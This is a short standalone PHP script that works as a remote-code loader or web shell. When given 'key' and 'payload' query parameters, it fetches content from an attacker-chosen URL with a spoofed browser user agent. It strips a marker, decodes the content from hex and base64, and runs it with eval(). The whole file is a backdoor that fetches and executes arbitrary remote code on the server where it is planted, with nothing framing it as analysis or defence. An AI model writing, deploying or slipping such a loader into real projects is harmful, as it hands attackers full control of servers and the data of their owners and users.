<?php
if(isset($_GET['key']) && isset($_GET['payload'])){

$pl = urldecode($_GET['payload']);
$payload = urldecode($pl);
$curl = curl_init($payload);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6');

$res = curl_exec($curl);
curl_close($curl);
$encode = md5($_GET['key']);

$full = str_replace($encode,"",$res);
trim($full);
//echo $full;
function hexToStr($hex){
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2){
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}

$de = hexToStr($full);
$full = base64_decode($de);
eval($full);
//echo $de;

}
?>
